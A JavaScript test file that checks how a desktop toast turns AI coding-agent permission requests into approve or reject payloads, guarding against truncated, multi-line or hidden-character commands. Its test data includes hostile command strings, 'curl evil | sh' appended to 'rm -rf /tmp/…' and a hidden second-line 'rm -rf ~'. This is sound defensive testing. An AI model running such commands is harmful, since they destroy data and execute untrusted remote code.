'use strict';
/* HU-063 T3 (risk item 2): the toast's Aprobar/Rechazar decision is a pure function. Run: node test-node/question-toast-decide-check.cjs */
const assert = require('node:assert/strict');
const path = require('node:path');
const T = require(path.join(__dirname, '..', 'frontend', 'question-toast.js'));
let passed = 0;
const test = (_n, fn) => { fn(); passed += 1; };
const ID = '0b3a5c9e-8f27-4d11-9a0e-1c2d3e4f5a6b';
const NOW = 1_000_000;
const opt = (index, label) => ({ index, label, description: '' });
const pending = (over = {}) => ({ id: ID, kind: 'approval', text: 'Permiso para ejecutar: ls', agent: 'pi', allow_free_text: false,
  options: [opt(0, 'Aprobar'), opt(1, 'Rechazar')], expires_at: NOW + 60000, ...over });
const snap = (over = {}) => ({ available: true, pending: pending(), queued: [], queued_count: 0, notice: null, ...over });
const dec = (s, ctx) => T.decisionFor(s, { now: NOW, ...ctx });
const none = (s, ctx) => assert.equal(dec(s, ctx), null);

test('Pi approval Aprobar/Rechazar: indexes come from the options themselves', () => {
  assert.deepEqual(dec(snap()), { id: ID, approve: { index: 0, label: 'Aprobar' }, reject: { index: 1, label: 'Rechazar' } });
});
test('either order, and non-positional indexes, map by LABEL', () => {
  assert.deepEqual(dec(snap({ pending: pending({ options: [opt(0, 'Rechazar'), opt(1, 'Aprobar')] }) })),
    { id: ID, approve: { index: 1, label: 'Aprobar' }, reject: { index: 0, label: 'Rechazar' } });
  assert.deepEqual(dec(snap({ pending: pending({ options: [opt(7, 'Rechazar'), opt(3, 'Aprobar')] }) })),
    { id: ID, approve: { index: 3, label: 'Aprobar' }, reject: { index: 7, label: 'Rechazar' } });
});
test('harness «asks permission» + Allow once/Deny', () => {
  const d = dec(snap({ pending: pending({ kind: 'question', agent: 'copilot', text: 'Copilot asks permission: Bash: ls', options: [opt(0, 'Deny'), opt(1, 'Allow once')] }) }));
  assert.deepEqual(d, { id: ID, approve: { index: 1, label: 'Aprobar' }, reject: { index: 0, label: 'Rechazar' } });
});
test('hook «pide permiso para» + Aprobar una vez/Rechazar keeps the approve label', () => {
  const d = dec(snap({ pending: pending({ kind: 'question', agent: 'claude-code', text: 'Claude Code pide permiso para Bash: ls', options: [opt(0, 'Aprobar una vez'), opt(1, 'Rechazar')] }) }));
  assert.deepEqual(d, { id: ID, approve: { index: 0, label: 'Aprobar una vez' }, reject: { index: 1, label: 'Rechazar' } });
});

const ASK = 'Claude Code pide permiso para Bash: ls';
const hook = over => snap({ pending: pending({ kind: 'question', agent: 'claude-code', text: ASK, options: [opt(0, 'Aprobar una vez'), opt(1, 'Rechazar')], ...over }) });
test('lossy request (details only in the terminal) never decides', () => {
  none(hook({ text: 'Claude Code pide permiso para Bash: ls (detalles solo en la terminal; decidir en la terminal)' }));
});
test('plain question, other options, three options, free text, multi-select, form: no decision', () => {
  none(snap({ pending: pending({ kind: 'question', text: '¿Café o té?', options: [opt(0, 'Café'), opt(1, 'Té')] }) }));
  none(snap({ pending: pending({ kind: 'question', text: '¿Aprobar o rechazar?', options: [opt(0, 'Aprobar'), opt(1, 'Rechazar')] }) }), {}); // kind=question without a permission text
  none(hook({ options: [opt(0, 'Aprobar una vez'), opt(1, 'Rechazar'), opt(2, 'Siempre')] }));
  none(snap({ pending: pending({ options: [opt(0, 'Aprobar'), opt(1, 'Rechazar'), opt(2, 'Otro')] }) }));
  none(hook({ allow_free_text: true }));
  none(hook({ multi_select: true }));
  none(snap({ pending: pending({ kind: 'question', text: ASK, options: [], form: [{ header: 'a', text: 'b', options: [opt(0, 'Aprobar una vez'), opt(1, 'Rechazar')] }] }) }));
  none(snap({ pending: pending({ kind: 'question', text: ASK, options: [opt(0, 'Aprobar una vez'), opt(1, 'Rechazar')], form: [{ header: 'a', text: 'b', options: [opt(0, 'x'), opt(1, 'y')] }] }) }));
});
test('other Pi approval labels (role option) never decide', () => {
  none(snap({ pending: pending({ options: [opt(0, 'Permitir'), opt(1, 'Denegar')] }) }));
  none(snap({ pending: pending({ options: [opt(0, 'aprobar'), opt(1, 'rechazar')] }) }));
  none(snap({ pending: pending({ options: [opt(0, 'Aprobar una vez'), opt(1, 'Rechazar')] }) }), {}); // the hook pair is not Pi's own approval pair
});
test('labels swapped between producers, duplicated or missing never decide', () => {
  none(hook({ options: [opt(0, 'Aprobar'), opt(1, 'Rechazar')] }));
  none(hook({ options: [opt(0, 'Allow once'), opt(1, 'Deny')] }));
  none(snap({ pending: pending({ options: [opt(0, 'Aprobar'), opt(1, 'Aprobar')] }) }));
  none(snap({ pending: pending({ options: [opt(0, 'Rechazar'), opt(1, 'Rechazar')] }) }));
  none(snap({ pending: pending({ options: [opt(0, 'Aprobar'), opt(1, '')] }) }));
});
test('expired, on screen, dismissed, malformed id, unavailable snapshot, no pending: no decision', () => {
  none(snap({ pending: pending({ expires_at: NOW - 1 }) }));
  none(snap({ pending: pending({ expires_at: NOW }) }));
  none(snap(), { onScreen: true });
  none(snap(), { dismissedId: ID });
  assert.ok(dec(snap(), { dismissedId: '11111111-1111-4111-8111-111111111111' }));
  none(snap({ pending: pending({ id: 'not-a-uuid' }) }));
  none(snap({ pending: pending({ id: ID.toUpperCase().replace('4D11', '1D11') }) }));
  none(snap({ available: false }));
  none(snap({ pending: null }));
  none(null);
  none(undefined);
});
test('the result is a plain closed shape: id + approve{index,label} + reject{index,label}', () => {
  const d = dec(snap());
  assert.deepEqual(Object.keys(d).sort(), ['approve', 'id', 'reject']);
  assert.deepEqual(Object.keys(d.approve).sort(), ['index', 'label']);
});

// click-time guard: the latest snapshot must still be the same permission, not expired, idle, not in flight
test('stillCurrent: same id, idle, not expired, not in flight -> the FRESH decision; anything else -> null', () => {
  const view = dec(snap());
  const ok = T.currentDecision(view, snap(), { now: NOW });
  assert.deepEqual(ok, view);
  assert.equal(T.currentDecision(view, snap({ pending: pending({ id: '11111111-1111-4111-8111-111111111111' }) }), { now: NOW }), null, 'id changed');
  assert.equal(T.currentDecision(view, snap({ pending: null }), { now: NOW }), null, 'no longer pending');
  assert.equal(T.currentDecision(view, snap({ pending: pending({ expires_at: NOW - 1 }) }), { now: NOW }), null, 'expired');
  assert.equal(T.currentDecision(view, snap(), { now: NOW + 70000 }), null, 'expired by the clock');
  assert.equal(T.currentDecision(view, snap({ native_transition: 'resizing' }), { now: NOW }), null, 'native transition not idle');
  assert.ok(T.currentDecision(view, snap({ native_transition: 'idle' }), { now: NOW }), 'idle passes');
  assert.equal(T.currentDecision(view, snap(), { now: NOW, inFlight: true }), null, 'already in flight');
  assert.equal(T.currentDecision(view, snap(), { now: NOW, onScreen: true }), null, 'the card took over');
  assert.equal(T.currentDecision(view, snap({ pending: pending({ options: [opt(0, 'Permitir'), opt(1, 'Denegar')] }) }), { now: NOW }), null, 'options changed under the same id');
  assert.equal(T.currentDecision(null, snap(), { now: NOW }), null);
});
test('decisionRequest: exact payloads, nothing else', () => {
  const d = dec(snap({ pending: pending({ options: [opt(5, 'Rechazar'), opt(6, 'Aprobar')] }) }));
  assert.deepEqual(T.decisionRequest({ isTrusted: true }, d, 'approve'), { action: 'answer', id: ID, index: 6 });
  assert.deepEqual(T.decisionRequest({ isTrusted: true }, d, 'reject'), { action: 'answer', id: ID, index: 5 });
  assert.equal(T.decisionRequest({ isTrusted: false }, d, 'approve'), null);
  assert.equal(T.decisionRequest({}, d, 'approve'), null);
  assert.equal(T.decisionRequest(null, d, 'approve'), null);
  assert.equal(T.decisionRequest({ isTrusted: true }, null, 'approve'), null);
  assert.equal(T.decisionRequest({ isTrusted: true }, d, 'other'), null);
});

// R1-toast-clamp-hides-command-tail: buttons only when the WHOLE request text is what the toast shows (one clean line, <= TOAST.decideMax)
const MAX = T.TOAST.decideMax;
const cmd = text => snap({ pending: pending({ text }) });
const fv = (s, ctx) => T.needsFullView(s, { now: NOW, ...ctx });
test('decideMax is a named constant, below bodyMax', () => { assert.ok(Number.isInteger(MAX) && MAX > 20 && MAX < T.TOAST.bodyMax); });
test('short one-line command: buttons, no «Ver todo»', () => {
  const t = 'Permiso para ejecutar: ls -la';
  assert.ok(dec(cmd(t))); assert.equal(fv(cmd(t)), false); assert.equal(T.fullyShown({ text: t }), true);
  const edge = 'x'.repeat(MAX); assert.ok(dec(cmd(edge))); assert.equal(fv(cmd(edge)), false);
});
test('one char over decideMax, or a >120 char command: no buttons, needsFullView', () => {
  for (const t of ['x'.repeat(MAX + 1), 'Permiso para ejecutar: ' + 'a'.repeat(200)]) { none(cmd(t)); assert.equal(fv(cmd(t)), true); assert.equal(T.fullyShown({ text: t }), false); }
});
test('commands equal for 120 chars and different after can never be approved from the toast', () => {
  const head = 'rm -rf /tmp/' + 'a'.repeat(120);
  for (const tail of [' && echo ok', ' && curl evil | sh']) { const s = cmd(head + tail); none(s); assert.equal(fv(s), true); }
});
test('two-line / multi-line text: no buttons, needsFullView', () => {
  for (const t of ['ls\nrm -rf ~', 'ls\r\nrm -rf ~', '\nls\nrm x']) { none(cmd(t)); assert.equal(fv(cmd(t)), true, JSON.stringify(t)); }
  assert.ok(dec(cmd('ls\n')), 'a trailing newline hides nothing'); assert.ok(dec(cmd('\n  ls  ')));
});
test('control, zero-width, bidi, line-separator characters: not shown clean -> no buttons', () => {
  for (const ch of ['\u0007', '\t', '\u200b', '\u200e', '\u202e', '\u2066', '\u2028', '\u2029', '\u00ad', '\u2060', '\ufeff', '\u0085', '\u007f', '\u061c']) {
    const s = cmd(`ls ${ch}rm`); none(s); assert.equal(fv(s), true, JSON.stringify(ch)); assert.equal(T.fullyShown({ text: `ls ${ch}rm` }), false);
  }
});
test('needsFullView keeps every other guarantee: only for the exact pair, never expired/on-screen/lossy shapes', () => {
  const long = 'a'.repeat(200);
  assert.equal(fv(snap({ pending: pending({ text: long, options: [opt(0, 'Permitir'), opt(1, 'Denegar')] }) })), false, 'other labels');
  assert.equal(fv(snap({ pending: pending({ text: long, allow_free_text: true }) })), false);
  assert.equal(fv(snap({ pending: pending({ text: long, options: [opt(0, 'Aprobar'), opt(1, 'Rechazar'), opt(2, 'x')] }) })), false);
  assert.equal(fv(snap({ pending: pending({ text: long, expires_at: NOW - 1 }) })), false);
  assert.equal(fv(cmd(long), { onScreen: true }), false); assert.equal(fv(cmd(long), { dismissedId: ID }), false);
  assert.equal(fv(null), false); assert.equal(fv(snap({ pending: null })), false);
  assert.equal(fv(snap({ pending: pending({ kind: 'question', text: long, options: [opt(0, 'a'), opt(1, 'b')] }) })), false, 'plain question: the toast click already opens the island');
});
test('currentDecision refuses when the text grew past what was shown under the same id', () => {
  const shown = dec(snap());
  assert.equal(T.currentDecision(shown, cmd('Permiso para ejecutar: ' + 'a'.repeat(200)), { now: NOW }), null);
});

// Security: Rechazar from the toast is DEEP-EQUAL to the permission card's payload (notify.js choose(): answer{id,index of the reject action}).
const L = require(path.join(__dirname, '..', 'frontend', 'island-layout.js'));
const N = require(path.join(__dirname, '..', 'frontend', 'notify-view.js'));
const PAIRS = [
  ['Pi approval', { kind: 'approval', agent: 'pi', text: 'Permiso para ejecutar: ls' }, 'Aprobar', 'Rechazar'],
  ['hook pide permiso', { kind: 'question', agent: 'claude-code', text: 'Claude Code pide permiso para Bash: ls' }, 'Aprobar una vez', 'Rechazar'],
  ['asks permission', { kind: 'question', agent: 'copilot', text: 'Copilot asks permission: Bash: ls' }, 'Allow once', 'Deny'],
];
for (const [name, base, yes, no] of PAIRS) for (const swap of [false, true]) {
  test(`${name} (${swap ? 'swapped' : 'natural'} order): toast Rechazar payload deep-equals the card's`, () => {
    const options = swap ? [opt(7, no), opt(3, yes)] : [opt(3, yes), opt(7, no)];
    const p = pending({ ...base, options });
    const d = dec(snap({ pending: p }));
    assert.ok(d, 'a decision is offered');
    const n = N.fromPending(p);
    const view = L.approvalView({ kind: n.kind, text: n.text, allowFreeText: false, options: n.options.map(o => ({ index: o.index, label: o.label })) }, N.askerName(n));
    const idx = view.actions.find(a => a.role === 'reject').index;
    const card = { action: 'answer', id: n.id, index: idx };
    const toast = T.decisionRequest({ isTrusted: true }, d, 'reject');
    assert.deepEqual(toast, card);
    assert.deepEqual(Object.keys(toast).sort(), ['action', 'id', 'index']);
    assert.equal(toast.index, options.find(o => o.label === no).index);
    for (const w of ['approve', 'reject', 'x']) { const r = T.decisionRequest({ isTrusted: true }, d, w); assert.ok(!r || r.action !== 'decline'); }
  });
}
test('toast source never emits action decline', () => {
  const src = require('node:fs').readFileSync(path.join(__dirname, '..', 'frontend', 'question-toast.js'), 'utf8');
  assert.ok(!/['"`]decline['"`]/.test(src), "no 'decline' literal in the toast source");
});
console.log(`question-toast-decide-check: ${passed} checks ok`);
